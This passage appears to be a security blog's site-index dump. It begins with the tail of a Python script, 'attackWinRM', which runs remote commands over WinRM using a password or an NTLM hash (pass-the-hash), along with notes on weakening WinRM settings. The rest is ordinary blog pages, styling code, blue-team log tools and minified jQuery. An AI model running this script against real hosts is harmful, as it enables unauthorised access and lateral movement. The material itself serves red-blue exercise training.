parser.add_argument(&quot;-u&quot;,action=&#x27;store&#x27;,dest=&#x27;user&#x27;,default=&quot;administrator&quot;,help=&#x27;WinRM username&#x27;) parser.add_argument(&quot;-p&quot;,metavar=&quot;&quot;,dest=&#x27;pwd&#x27;,help=&quot;WinRM password&quot;) parser.add_argument(&quot;-H&quot;,action=&#x27;store&#x27;,dest=&#x27;hpwd&#x27;,help=&quot;NTLM-Hash password&quot;) parser.add_argument(&quot;-c&quot;,action=&#x27;store&#x27;,dest=&#x27;cmd&#x27;,default=&quot;whoami&quot;,help=&quot;cmd shell&quot;) return parser.parse_args()def attackWinRM(path,ip,port,cmd,**shell): if shell.get(&quot;hpwd&quot;): try: wincmd = winrm.Session(&#x27;http://&#x27; + ip + &quot;:&quot; + str(port) + path, auth=(shell.get(&quot;user&quot;), &#x27;00000000000000000000000000000000:&#x27; + shell.get(&quot;hpwd&quot;)), transport=&quot;ntlm&quot;, server_cert_validation=&#x27;ignore&#x27;) result = wincmd.run_cmd(str(cmd)) sys.stdout.write(result.std_out.decode(&#x27;gbk&#x27;)) sys.stdout.write(result.std_err.decode(&#x27;gbk&#x27;)) sys.stdout.write(&#x27; &#x27;) except Exception as e: print(&quot;[-]Hash Assword Error:&quot; + str(e)) else: try: wincmd = winrm.Session(&#x27;http://&#x27; + ip + &quot;:&quot; + str(port) + path, auth=(shell.get(&quot;user&quot;), shell.get(&quot;pwd&quot;)), transport=&quot;basic&quot;, server_cert_validation=&#x27;ignore&#x27;) result = wincmd.run_cmd(str(cmd)) sys.stdout.write(result.std_out.decode(&#x27;gbk&#x27;)) sys.stdout.write(result.std_err.decode(&#x27;gbk&#x27;)) sys.stdout.write(&#x27; &#x27;) except Exception as e: print(&quot;[-]Password Error:&quot; + str(e))def Main(): args = parseFlag() getURLState(args.url) path, ip, port = splitURL(args.url) attackWinRM(path,ip,port,args.cmd, user=args.user, hpwd=args.hpwd, pwd=args.pwd)if __name__ == &#x27;__main__&#x27;: Main() 使用此脚本用明文密码登录时，需要为WinRM service 配置auth：winrm set winrm/config/service/auth @&#123;Basic=&quot;true&quot;&#125;还要为WinRM service配置加密方式为允许非加密：winrm set winrm/config/service @&#123;AllowUnencrypted=&quot;true&quot;&#125;用Hash登录时，需使用NTLM Hash。","tags":["蓝队","攻防演练","事件研判","应急响应","安全运营"],"categories":["红蓝对抗","蓝队"]},{"title":"测试","path":"/2023/07/13/d9d69388/","content":"测试","tags":["蓝队","攻防演练","事件研判","应急响应","安全运营"],"categories":["红蓝对抗","蓝队"]},{"path":"/about/index.html","content":"SafeKiller Zone自我介绍建站初衷&nbsp;&nbsp;我是SafeKiller Zone,身为一名网络安全讲师，对技术充满了无比的热爱和追求。每一天，我都致力于深入探索这个快速发展的领域，不断学习最新的安全策略和防御技术。尽管在这条道路上，我不可避免地会遇到复杂的技术难题，但正是这些挑战，激发了我解决问题的热情，也锻炼了我的技能。我始终相信，每一个问题都是一个机会，一个提升自己的机会，使我能够将学到的宝贵知识传授给我的学生们，并帮助他们在网络安全这个不断演变的领域中取得成功。&nbsp;作为一名对网络安全和运维充满热情的专业人士，我创建这个博客是为了分享我的知识和经验。我希望这个网站能够帮助大家更好地理解网络安全的复杂性，并提供实用的技术指导和行业最佳实践。我热切希望我的博客能够为大家的学习和成长之路添砖加瓦。 博客发展史2019年11 月 29日接触WordPress和Centos部署博客,那时写的文章都偏向于开发和运维····2021年06 月 17日将主题换成了子比的,慢慢的更新更多的文章,水平也慢慢的变高了2022年09 月 22日由于Wordpress是MVC架构,插件也较多容易出现各种漏洞,后面就换成了Hexo博客····2024年01 月 25日争取上架尽可能全的安全运维和Web渗透的wiki···· 2023年年度总结 O1 2024年的小目标：学习技术，挣钱，完善WIKI,出更多的视频 正常 65% KR1 小成就：游戏鉴赏家 通关《博德之门3》通关《杀戮尖塔》AC20带萌新VAN《怪物猎人崛起》单刷《怪物猎人世界》米拉小姐15min左右加5min 已完成 100% KR2 小目标：完成博客的搭建和主要个性化页面设计 黑夜模式欢迎语接入音乐大量的废话 正常 60% KR-3 丰富个人博客网站（我需要更多的前端知识，迫切需要大佬） 接入赞助我……求大佬们打赏接入Steam让大家看看我傲人的游戏时长多写几篇佳作，发布技术文章。嘿！让大家看看 未完成 10% KR4 文章完成情况 后端前端测试运维论文和pptelasticsearch购物搜索的中文提示词该怎么设计？！业务实现了，效率性能呢?十年前的老网站，不入流，且不合适的拼接技术感觉没啥问题啊，哈哈哈，怎么了这是？！一个头两个大前面还堵着呢 延期 90%"},{"path":"/comments/index.html","content":"留言板 &nbsp;&nbsp;你可以在这里留盐，我会找到你的，放心大胆发言，欢迎再来关顾我的小站，就怕一段时间我又消失了，请来提醒我。&nbsp;&nbsp;当然，你可以给我提出一些更好的意见，也可以提携我走入行业深处，教会我更多编程、历史、小说、游戏等方面的知识，因为我还是个超级小白。&nbsp;&nbsp;最后，愿来者都能有所收获！"},{"path":"/css/darkmode.css","content":"#Dark:root { --site-bg: #1c1e21; --card: #373d43; --block: #26292c; --block-border: #383d42; --block-hover: #2f3337; --alpha20: rgba(0,0,0,0.2); --alpha50: rgba(0,0,0,0.5); --alpha60: rgba(0,0,0,0.6); --alpha75: rgba(0,0,0,0.75); --alpha100: #000; --sidebar-bg: #383d42; --text: #fff; --text-p0: #fff; --text-p1: #ccc; --text-p2: #b3b3b3; --text-p3: #858585; --text-p4: #707070; --text-meta: #4d4d4d; --text-code: #ff6333; } @media screen and (max-width: 667px) { #Dark:root { --site-bg: #000; } } #Dark:root { --blur-bg: rgba(0,0,0,0.5); } #Dark .float-panel { --blur-bg: rgba(0,0,0,0.4); } #Dark .tag-plugin.tag { --theme: #ff6333; --theme-bg1: #3d1e14; --theme-bg2: #2f2522; --theme-border: #5c2d1f; --text-p0: #ffc4b3; --text-p1: #dfae9f; --text-p2: #f1997e; } #Dark .tag-plugin[color='red'] { --theme: #f44336; --theme-bg1: #3d1714; --theme-bg2: #2f2322; --theme-border: #5c231f; --text-p0: #ffb8b3; --text-p1: #dfa49f; --text-p2: #f1867e; } #Dark .tag-plugin[color='orange'] { --theme: #fa6400; --theme-bg1: #3d2514; --theme-bg2: #2f2722; --theme-border: #5c371f; --text-p0: #ffd1b3; --text-p1: #dfb99f; --text-p2: #f1ac7e; } #Dark .tag-plugin[color='yellow'] { --theme: #ffbd2b; --theme-bg1: #3d3014; --theme-bg2: #2f2b22; --theme-border: #5c491f; --text-p0: #ffe7b3; --text-p1: #dfcb9f; --text-p2: #f1cd7e; } #Dark .tag-plugin[color='green'] { --theme: #3dc550; --theme-bg1: #143d1a; --theme-bg2: #222f24; --theme-border: #1f5c27; --text-p0: #b3ffbd; --text-p1: #9fdfa8; --text-p2: #7ef18e; } #Dark .tag-plugin[color='cyan'] { --theme: #1bcdfc; --theme-bg1: #14353d; --theme-bg2: #222d2f; --theme-border: #1f4f5c; --text-p0: #b3efff; --text-p1: #9fd2df; --text-p2: #7ed9f1; } #Dark .tag-plugin[color='blue'] { --theme: #2196f3; --theme-bg1: #142b3d; --theme-bg2: #222a2f; --theme-border: #1f415c; --text-p0: #b3ddff; --text-p1: #9fc3df; --text-p2: #7ebef1; } #Dark .tag-plugin[color='purple'] { --theme: #9c27b0; --theme-bg1: #37143d; --theme-bg2: #2d222f; --theme-border: #531f5c; --text-p0: #f4b3ff; --text-p1: #d69fdf; --text-p2: #e07ef1; } #Dark .tag-plugin[color='light'] { --theme-border: #fff; --theme-bg1: #e0e0e0; --theme-bg2: #fff; --text-p0: #000; --text-p1: #111; --text-p2: #1f1f1f; --text-p3: #555; --text-code: #fff; } #Dark .tag-plugin[color='dark'] { --theme-border: #000; --theme-bg1: #1f1f1f; --theme-bg2: #111; --text-p0: #fff; --text-p1: #fff; --text-p2: #e0e0e0; --text-p3: #ddd; --text-code: #fff; } #Dark .tag-plugin[color='warning'], #Dark .tag-plugin[color='light'] { --text-p0: #000; --text-p1: #111; --text-p2: #1f1f1f; --text-p3: #555; --text-code: #fff; } #Dark .tag-plugin { --theme: var(--text-p1); --theme-border: var(--block-border); --theme-block: var(--block); --theme-codeblock: var(--block); } #Dark .social-wrap a.social:hover { box-shadow: none; } #Dark .widget-wrapper.timeline .tag-plugin.timeline .timenode .header p { color: var(--text-p2); } #Dark .widget-wrapper.timeline .tag-plugin.timeline .timenode .body { border-radius: 12px; background: var(--alpha50); box-shadow: none; } #Dark a.button.start.gradient { transition: 0.38s ease-out; position: relative; z-index: 0; background: linear-gradient(to right, #4c95fa, #38c9fa, #24f9c4, #24f9c4, #38c9fa, #4c95fa); background-size: 1000%; color: #fff; text-shadow: 0 0 1px rgba(0,0,0,0.12); animation: glow 60s linear infinite; } #Dark .wl-comment.input, #Dark .wl-comment.output{ background-color:#26292c; border-radius:0.75em; border: 1px solid transparent; } /* waline评论样式 */ #Dark .wl-count{ padding: .375em; font-weight: bold; font-size: 1.25em; color: #fff; } #Dark .cmt-body.waline{ --waline-white: #000; --waline-light-grey: #666; --waline-dark-grey: #999; /* 布局颜色 */ --waline-color: #fff; --waline-bgcolor: var(--block); --waline-bgcolor-light: #272727; --waline-border-color: #333; --waline-disable-bgcolor: #444; --waline-disable-color: #272727; /* 特殊颜色 */ --waline-bq-color: #272727; /* 其他颜色 */ --waline-info-bgcolor: #272727; --waline-info-color: #666; } #Dark .wl-user-name { color: #999; } /* 不是ai制作标识 */ #Dark #notbyai { content: url(\"/assets/website/Written-By-Human-black.png\"); }"},{"path":"/css/override.css","content":".page-footer .text p { text-align: center; }"},{"title":"友链","path":"/friends/index.html","content":"自是因缘而来…… 我的朋友 申请友链 &nbsp;&nbsp;和我建立的友链关系,我会经常关顾您的站点.当你满足下面的条件,你可以直接申请友链,我会及时回应你的请求.&nbsp;&nbsp;不满足,你也可以先申请上,规矩并没有那么死.假如你的站点变成了一个僵尸站(一年以上没有动态也没有文章)或无法正常访问,我会暂时下架你的网站链接,我并不会嫌麻烦.当您的站点恢复时留言即可!&nbsp;&nbsp;最后我希望通过博文的形式丰富自己的学习内容,在一个偏向于技术的圈子里学到更多！ 大陆内能够正常访问. 有实质性原创内容的 HTTPS 站点. 合法的、非营利性、无商业广告、无木马植入. 发布过至少 10 篇原创文章,内容题材:计算机相关. 与 博主 有至少 3 次有效互动(有内容的留言或者 issue 等). 我已满足全部条件,快告诉我如何交换友链！第一步：新建Issue新建 Github Issue按照模板格式填写并提交.为了实现正常预览和提高预览速度,你需要检查提供的图片链接能正常访问,且优化图片大小第二步：添加友链等待我的审核12345&quot;title&quot;: &quot;SafeKiller_Zone&quot;,&quot;url&quot;: &quot;https://jiangjiyue.github.io/&quot;,&quot;avatar&quot;: &quot;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg&quot;,&quot;screenshot&quot;: &quot;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402061901753.png&quot;,&quot;description&quot;: &quot;深入网络安全策略与渗透技巧,附简明Linux及Nginx运维实践,助力构建坚实防线.&quot;待管理员审核通过,添加了 active 标签后,回来刷新即可生效.同时请将本站添加到你的友链中：如果您需要更新自己的友链,请直接修改 issue 内容,大约 3 分钟内生效,无需等待博客更新. 关于交友 &nbsp;&nbsp;我认为,建立和维持健康的人际关系,需遵循以下原则：&nbsp;&nbsp;&nbsp;&nbsp;1. 保持诚信和透明度,坦诚相见.&nbsp;&nbsp;&nbsp;&nbsp;2. 尊重个体差异,理解每个人都有独特的价值.&nbsp;&nbsp;&nbsp;&nbsp;3. 倾听比说更重要,了解他人需求.&nbsp;&nbsp;&nbsp;&nbsp;4. 互相支持,特别是在对方需要帮助时.&nbsp;&nbsp;&nbsp;&nbsp;5. 共同成长,勇于面对挑战和解决冲突.&nbsp;&nbsp;&nbsp;&nbsp;6. 庆祝成功,共享快乐时光.&nbsp;&nbsp;&nbsp;&nbsp;7. 维持适当界限,以保护个人隐私和空间."},{"path":"/js/darkmode.js","content":"/** * 监听系统主题 * @type {MediaQueryList} */ var OSTheme = window.matchMedia('(prefers-color-scheme: dark)'); OSTheme.addListener(e => { if (window.localStorage.getItem('Theme_Mode') === 'auto') { ThemeChange('auto'); } }) /** * 自动模式 6:00-18:00-Light 18:00-6:00-Dark,开启后每三十分钟检查一次 */ const AutoMode = (htmlElement) => { var date = new Date(); var hours = date.getHours(); if (hours < 18 && hours >= 6) { document.querySelector(\"html\").id = \"Light\"; } else { document.querySelector(\"html\").id = \"Dark\"; } // if (htmlElement.id === \"Light\") { // 闪瞎你的眼模式（速度快一点的话） // htmlElement.id = \"Dark\"; // } else { htmlElement.id = \"Light\"; } } let autoTimer; /** * 修改博客主题 * @param theme 亮为light,暗为dark,自动为auto * @constructor */ const ThemeChange = (theme) => { // 清除计时器 clearInterval(autoTimer); // 抽取元素 const htmlElement = document.querySelector(\"html\"); let themeBtnIcon; try { themeBtnIcon = document.querySelector(\"#start > aside > div > footer > div > a:last-child > i\") } catch { // 元素不存在 } if (theme === 'light' || (theme === 'auto' && !OSTheme.matches)) { htmlElement.id = \"Light\"; if (themeBtnIcon) { themeBtnIcon.className = 'fa-solid fa-sun fa-spin fa-spin-reverse'; } } else { htmlElement.id = \"Dark\"; if (themeBtnIcon) { themeBtnIcon.className = 'fa-solid fa-moon fa-fade'; } } if (theme === 'auto') { if (themeBtnIcon) { themeBtnIcon.className = 'fa-solid fa-circle-half-stroke fa-flip'; } AutoMode(htmlElement); autoTimer = setInterval(function () { AutoMode(htmlElement); }, 1000 * 60 * 30); // 半小时一次 } window.localStorage.setItem('Theme_Mode', theme); } /** * 初始化博客主题 */ switch (window.localStorage.getItem('Theme_Mode')) { case 'light': ThemeChange('light'); break; case 'dark': ThemeChange('dark'); break; default: ThemeChange('auto'); } /** * 切换主题模式 */ // 绑定按钮点击事件 try { document.querySelector(\"#start > aside > div > footer > div > a:last-child\").onclick = () => { if (window.localStorage.getItem('Theme_Mode') === 'auto') { hud.toast('🌞白天模式'); ThemeChange('light'); } else if (window.localStorage.getItem('Theme_Mode') === 'light') { hud.toast('🌙 夜间模式'); ThemeChange('dark'); } else { hud.toast('🌞/🌙 自动模式'); ThemeChange('auto'); } } } catch { // 元素不存在 }"},{"path":"/notes/index.html","content":"随记随记 @tianhao_wang@eberhard@eberhard@eberhard@eberhard@vklemen"},{"path":"/tools/script.js","content":"function removeDuplicates() { // 从 input框 获取内容 var input = document.getElementsByClassName('input')[0]; var output = document.getElementsByClassName('output')[0]; var content = input.value.trim(); // 移除内容前后的空白 // 假设内容为逐行分隔的值，先将其分割成数组，并移除空行 var contentArray = content.split(' ').filter(item => item.trim() !== ''); // 移除非IP行，使用正则表达式匹配标准的IPv4地址 var ipRegex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/; var validContentArray = contentArray.filter(item => ipRegex.test(item)); // 计算去重前的数据量 var beforeCount = validContentArray.length; // 使用 Set 去除数组中的重复项 var uniqueContentArray = [...new Set(validContentArray)]; // 计算去重后的数据量 var afterCount = uniqueContentArray.length; // 计算去重的数据量 var removedCount = beforeCount - afterCount; // 生成更新信息 var updateInfo = `去重前的数据量: ${beforeCount} 去重后的数据量: ${afterCount} 去重的数据量: ${removedCount} `; // 将去重后的数组内容再次转换为逐行分隔的字符串 var uniqueContent = uniqueContentArray.join(' '); // 更新 output 的内容，加上去重信息 output.value = updateInfo + uniqueContent; } function sumOccurrencesByCountry() { const countryList = [ '阿富汗', '阿尔巴尼亚', '阿尔及利亚', '安道尔', '安哥拉', '安提瓜和巴布达', '阿根廷', '亚美尼亚', '澳大利亚', '奥地利', '阿塞拜疆', '巴哈马', '巴林', '孟加拉国', '巴巴多斯', '白俄罗斯', '比利时', '伯利兹', '贝宁', '不丹', '玻利维亚', '波黑', '博茨瓦纳', '巴西', '文莱', '保加利亚', '布基纳法索', '布隆迪', '柬埔寨', '喀麦隆', '加拿大', '佛得角', '中非', '乍得', '智利', '中国', '哥伦比亚', '科摩罗', '刚果（布）', '刚果（金）', '哥斯达黎加', '克罗地亚', '古巴', '塞浦路斯', '捷克', '丹麦', '吉布提', '多米尼克', '多米尼加', '东帝汶', '厄瓜多尔', '埃及', '萨尔瓦多', '赤道几内亚', '厄立特里亚', '爱沙尼亚', '斯威士兰', '埃塞俄比亚', '斐济', '芬兰', '法国', '加蓬', '冈比亚', '格鲁吉亚', '德国', '加纳', '希腊', '格林纳达', '危地马拉', '几内亚', '几内亚比绍', '圭亚那', '海地', '洪都拉斯', '匈牙利', '冰岛', '印度', '印度尼西亚', '伊朗', '伊拉克', '爱尔兰', '以色列', '意大利', '牙买加', '日本', '约旦', '哈萨克斯坦', '肯尼亚', '基里巴斯', '韩国', '科威特', '吉尔吉斯斯坦', '老挝', '拉脱维亚', '黎巴嫩', '莱索托', '利比里亚', '利比亚', '列支敦士登', '立陶宛', '卢森堡', '马达加斯加', '马拉维', '马来西亚', '马尔代夫', '马里', '马耳他', '马绍尔群岛', '毛里塔尼亚', '毛里求斯', '墨西哥', '密克罗尼西亚', '摩尔多瓦', '摩纳哥', '蒙古', '黑山', '摩洛哥', '莫桑比克', '缅甸', '纳米比亚', '瑙鲁', '尼泊尔', '荷兰', '新西兰', '尼加拉瓜', '尼日尔', '尼日利亚', '北马其顿', '挪威', '阿曼', '巴基斯坦', '帕劳', '巴勒斯坦', '巴拿马', '巴布亚新几内亚', '巴拉圭', '秘鲁', '菲律宾', '波兰', '葡萄牙', '卡塔尔', '罗马尼亚', '俄罗斯', '卢旺达', '圣基茨和尼维斯', '圣卢西亚', '圣文森特和格林纳丁斯', '萨摩亚', '圣马力诺', '圣多美和普林西比', '沙特阿拉伯', '塞内加尔', '塞尔维亚', '塞舌尔', '塞拉利昂', '新加坡', '斯洛伐克', '斯洛文尼亚', '所罗门群岛', '索马里', '南非', '南苏丹', '西班牙', '斯里兰卡', '苏丹', '苏里南', '瑞典', '瑞士', '叙利亚', '塔吉克斯坦', '坦桑尼亚', '泰国', '多哥', '汤加', '特立尼达和多巴哥', '突尼斯', '土耳其', '土库曼斯坦', '图瓦卢', '乌干达', '乌克兰', '阿联酋', '英国', '美国', '乌拉圭', '乌兹别克斯坦', '瓦努阿图', '梵蒂冈', '委内瑞拉', '越南', '也门', '赞比亚', '津巴布韦', '亚太地区', '欧盟' ]; const countryOccurrences = {}; // 获取输入文本框 var input = document.getElementsByClassName('input')[0]; // 处理输入内容 var content = input.value.trim(); var lines = content.split(' ').map(item => item.trim()); // 将输入文本按行分割并移除每行前后的空白 lines = lines.filter(line => line !== ''); // 去除空行 lines.shift(); // 删除第一行 // 遍历每行数据 lines.forEach(line => { var matchingCountry = countryList.find(country => line.includes(country)); // 在国家列表中查找与国家名称匹配的国家 if (matchingCountry) { if (!countryOccurrences[matchingCountry]) { countryOccurrences[matchingCountry] = 0; } countryOccurrences[matchingCountry]++; // 统计国家出现的次数 } else { // 如果没有匹配到任何国家，那么将其归类到'其他' var otherKey = '其他'; if (!countryOccurrences[otherKey]) { countryOccurrences[otherKey] = 0; } countryOccurrences[otherKey]++; } }); // 将结果转换成字符串形式并显示 var output = Object.entries(countryOccurrences) .sort((a, b) => b[1] - a[1]) // 按出现次数降序排序 .map(([country, count]) => `${country}\\t${count}`) .join(' '); // 获取输出文本框并将结果赋值 var resultOutput = document.getElementsByClassName('output')[0]; resultOutput.value = output; } function formatThreats() { var input = document.getElementsByClassName('input')[0]; var output = document.getElementsByClassName('output')[0]; // 分割输入成单行 var content = input.value.trim(); // 移除内容前后的空白 var lines = content.split(' ').map(item => item.trim()); // 移除每个元素前后的空白 lines = lines.filter(line => line !== ''); // 去除空行 // 移除总计行 lines.pop(); // 将每行数据转换为描述文本 var descriptions = lines.map((line, index) => { // 分割行为事件和次数 var parts = line.split('\\t'); var threat = parts[0].trim(); var count = parseInt(parts[1], 10); // 格式化描述，最后一个事件后面不加逗号 // 移除了事件和次数之间的空格 return `${threat}${index === lines.length - 1 ? '' : ''}${count}次`; }); // 加入描述文本间的连接词 output.value = descriptions.join('、'); } function parseIpAndOutput() { var input = document.getElementsByClassName('input')[0]; var output = document.getElementsByClassName('output')[0]; // 定义输出文本区域 var outputText = ''; // 分割输入文本为多行 var lines = input.value.split(' '); // 遍历每一行 lines.forEach(function (line) { // 使用正则表达式匹配IP地址和端口号 var match = line.match(/([\\d.]+)\\s+(\\d+)/); if (match) { // 获取IP地址和端口号 var ip = match[1]; var port = match[2]; // 格式化为'IP:端口'的形式 var result = ip + ':' + port; // 添加到输出文本 outputText += result + ' '; } }); // 将结果写入输出文本区域 output.value = outputText; } function generateTable() { var input = document.getElementsByClassName('input')[0]; var output = document.getElementsByClassName('output')[0]; // 解析JSON数据 var jsonData = JSON.parse(input.value); // 获取日期数据 var dates = jsonData.data.dataName; // 获取外部攻击数据 var externalAttacks = jsonData.data.dataValue[0].value; // 获取入侵主机数据 var intrusionHosts = jsonData.data.dataValue[1].value; // 创建表格头部 var table = \"时间\\t外部攻击\\t入侵主机 \"; // 遍历日期数据并生成表格内容 for (var i = 0; i < dates.length; i++) { var row = dates[i] + \"\\t\" + externalAttacks[i] + \"\\t\" + intrusionHosts[i] + \" \"; table += row; } output.value = table; } $(document).ready(function () { // 使用事件委托简化代码 $('.button-group').on('click', 'button.insert-btn', function () { var pattern = $(this).data('pattern'); insertText(pattern); }); // 将插入文本的逻辑抽象到一个函数中 function insertText(text) { var textarea = $('.output')[0]; // 选择第一个匹配的textarea元素 // 标准浏览器及IE9+ if (textarea.selectionStart || textarea.selectionStart === '0') { var startPos = textarea.selectionStart; var endPos = textarea.selectionEnd; textarea.value = textarea.value.substring(0, startPos) + text + textarea.value.substring(endPos, textarea.value.length); textarea.focus(); textarea.selectionStart = startPos + text.length; textarea.selectionEnd = startPos + text.length; // IE8及以下 } else if (document.selection) { textarea.focus(); var sel = document.selection.createRange(); sel.text = text; textarea.focus(); } else { textarea.value += text; textarea.focus(); } } // 绑定测试匹配按钮的点击事件 $('.parseIpAndOutput').click(parseIpAndOutput); // 周报 $('.generateTable').click(generateTable); $('.sumOccurrencesByCountry').click(sumOccurrencesByCountry); $('.formatThreats').click(formatThreats); $('.removeDuplicates').click(removeDuplicates); });"},{"title":"蓝队小工具-Kill3r","path":"/tools/index.html","content":"正则匹配周报其他功能取值按钮组转义按钮组匹配按钮组 取IP 取端口 取纯数字 取非空白 取所有字符 &lt; &gt; ( ) [ ] { } - : ; ' \" , . / 所有字符 空白 多空白 多非空白 多字母 多非字母 多数字 多非数字 日期JSON转换 地区聚合 字符格式化 IP去重 IP格式化 推荐直接把原始日志复制到文本框采用选中替换方式比较方便。"},{"path":"/tools/jquery-3.1.1.min.js","content":"/*! jQuery v3.1.1 | (c) jQuery Foundation | jquery.org/license */ !function(a,b){\"use strict\";\"object\"==typeof module&&\"object\"==typeof module.exports?module.exports=a.document?b(a,!0):function(a){if(!a.document)throw new Error(\"jQuery requires a window with a document\");return b(a)}:b(a)}(\"undefined\"!=typeof window?window:this,function(a,b){\"use strict\";var c=[],d=a.document,e=Object.getPrototypeOf,f=c.slice,g=c.concat,h=c.push,i=c.indexOf,j={},k=j.toString,l=j.hasOwnProperty,m=l.toString,n=m.call(Object),o={};function p(a,b){b=b||d;var c=b.createElement(\"script\");c.text=a,b.head.appendChild(c).parentNode.removeChild(c)}var q=\"3.1.1\",r=function(a,b){return new r.fn.init(a,b)},s=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g,t=/^-ms-/,u=/-([a-z])/g,v=function(a,b){return b.toUpperCase()};r.fn=r.prototype={jquery:q,constructor:r,length:0,toArray:function(){return f.call(this)},get:function(a){return null==a?f.call(this):a1?(c=[a,a,\"\",b],d.setFilters.hasOwnProperty(a.toLowerCase())?ia(function(a,c){var d,f=e(a,b),g=f.length;while(g--)d=I(a,f[g]),a[d]=!(c[d]=f[g])}):function(a){return e(a,0,c)}):e}},pseudos:{not:ia(function(a){var b=[],c=[],d=h(a.replace(P,\"$1\"));return d[u]?ia(function(a,b,c,e){var f,g=d(a,null,e,[]),h=a.length;while(h--)(f=g[h])&&(a[h]=!(b[h]=f))}):function(a,e,f){return b[0]=a,d(b,null,f,c),b[0]=null,!c.pop()}}),has:ia(function(a){return function(b){return ga(a,b).length>0}}),contains:ia(function(a){return a=a.replace(_,aa),function(b){return(b.textContent||b.innerText||e(b)).indexOf(a)>-1}}),lang:ia(function(a){return U.test(a||\"\")||ga.error(\"unsupported lang: \"+a),a=a.replace(_,aa).toLowerCase(),function(b){var c;do if(c=p?b.lang:b.getAttribute(\"xml:lang\")||b.getAttribute(\"lang\"))return c=c.toLowerCase(),c===a||0===c.indexOf(a+\"-\");while((b=b.parentNode)&&1===b.nodeType);return!1}}),target:function(b){var c=a.location&&a.location.hash;return c&&c.slice(1)===b.id},root:function(a){return a===o},focus:function(a){return a===n.activeElement&&(!n.hasFocus||n.hasFocus())&&!!(a.type||a.href||~a.tabIndex)},enabled:oa(!1),disabled:oa(!0),checked:function(a){var b=a.nodeName.toLowerCase();return\"input\"===b&&!!a.checked||\"option\"===b&&!!a.selected},selected:function(a){return a.parentNode&&a.parentNode.selectedIndex,a.selected===!0},empty:function(a){for(a=a.firstChild;a;a=a.nextSibling)if(a.nodeType-1!==c&&1===a.nodeType}))}r.filter=function(a,b,c){var d=b[0];return c&&(a=\":not(\"+a+\")\"),1===b.length&&1===d.nodeType?r.find.matchesSelector(d,a)?[d]:[]:r.find.matches(a,r.grep(b,function(a){return 1===a.nodeType}))},r.fn.extend({find:function(a){var b,c,d=this.length,e=this;if(\"string\"!=typeof a)return this.pushStack(r(a).filter(function(){for(b=0;b]*|#([\\w-]+))$/,G=r.fn.init=function(a,b,c){var e,f;if(!a)return this;if(c=c||E,\"string\"==typeof a){if(e=\"\"===a[a.length-1]&&a.length>=3?[null,a,null]:F.exec(a),!e||!e[1]&&b)return!b||b.jquery?(b||c).find(a):this.constructor(b).find(a);if(e[1]){if(b=b instanceof r?b[0]:b,r.merge(this,r.parseHTML(e[1],b&&b.nodeType?b.ownerDocument||b:d,!0)),B.test(e[1])&&r.isPlainObject(b))for(e in b)r.isFunction(this[e])?this[e](b[e]):this.attr(e,b[e]);return this}return f=d.getElementById(e[2]),f&&(this[0]=f,this.length=1),this}return a.nodeType?(this[0]=a,this.length=1,this):r.isFunction(a)?void 0!==c.ready?c.ready(a):a(r):r.makeArray(a,this)};G.prototype=r.fn,E=r(d);var H=/^(?:parents|prev(?:Until|All))/,I={children:!0,contents:!0,next:!0,prev:!0};r.fn.extend({has:function(a){var b=r(a,this),c=b.length;return this.filter(function(){for(var a=0;a1&&(I[a]||r.uniqueSort(e),H.test(a)&&e.reverse()),this.pushStack(e)}});var K=/[^\\x20\\t\\r \\f]+/g;function L(a){var b={};return r.each(a.match(K)||[],function(a,c){b[c]=!0}),b}r.Callbacks=function(a){a=\"string\"==typeof a?L(a):r.extend({},a);var b,c,d,e,f=[],g=[],h=-1,i=function(){for(e=a.once,d=b=!0;g.length;h=-1){c=g.shift();while(++h-1)f.splice(c,1),c-1:f.length>0},empty:function(){return f&&(f=[]),this},disable:function(){return e=g=[],f=c=\"\",this},disabled:function(){return!f},lock:function(){return e=g=[],c||b||(f=c=\"\"),this},locked:function(){return!!e},fireWith:function(a,c){return e||(c=c||[],c=[a,c.slice?c.slice():c],g.push(c),b||i()),this},fire:function(){return j.fireWith(this,arguments),this},fired:function(){return!!d}};return j};function M(a){return a}function N(a){throw a}function O(a,b,c){var d;try{a&&r.isFunction(d=a.promise)?d.call(a).done(b).fail(c):a&&r.isFunction(d=a.then)?d.call(a,b,c):b.call(void 0,a)}catch(a){c.call(void 0,a)}}r.extend({Deferred:function(b){var c=[[\"notify\",\"progress\",r.Callbacks(\"memory\"),r.Callbacks(\"memory\"),2],[\"resolve\",\"done\",r.Callbacks(\"once memory\"),r.Callbacks(\"once memory\"),0,\"resolved\"],[\"reject\",\"fail\",r.Callbacks(\"once memory\"),r.Callbacks(\"once memory\"),1,\"rejected\"]],d=\"pending\",e={state:function(){return d},always:function(){return f.done(arguments).fail(arguments),this},\"catch\":function(a){return e.then(null,a)},pipe:function(){var a=arguments;return r.Deferred(function(b){r.each(c,function(c,d){var e=r.isFunction(a[d[4]])&&a[d[4]];f[d[1]](function(){var a=e&&e.apply(this,arguments);a&&r.isFunction(a.promise)?a.promise().progress(b.notify).done(b.resolve).fail(b.reject):b[d[0]+\"With\"](this,e?[a]:arguments)})}),a=null}).promise()},then:function(b,d,e){var f=0;function g(b,c,d,e){return function(){var h=this,i=arguments,j=function(){var a,j;if(!(b=f&&(d!==N&&(h=void 0,i=[a]),c.rejectWith(h,i))}};b?k():(r.Deferred.getStackHook&&(k.stackTrace=r.Deferred.getStackHook()),a.setTimeout(k))}}return r.Deferred(function(a){c[0][3].add(g(0,a,r.isFunction(e)?e:M,a.notifyWith)),c[1][3].add(g(0,a,r.isFunction(b)?b:M)),c[2][3].add(g(0,a,r.isFunction(d)?d:N))}).promise()},promise:function(a){return null!=a?r.extend(a,e):e}},f={};return r.each(c,function(a,b){var g=b[2],h=b[5];e[b[1]]=g.add,h&&g.add(function(){d=h},c[3-a][2].disable,c[0][2].lock),g.add(b[3].fire),f[b[0]]=function(){return f[b[0]+\"With\"](this===f?void 0:this,arguments),this},f[b[0]+\"With\"]=g.fireWith}),e.promise(f),b&&b.call(f,f),f},when:function(a){var b=arguments.length,c=b,d=Array(c),e=f.call(arguments),g=r.Deferred(),h=function(a){return 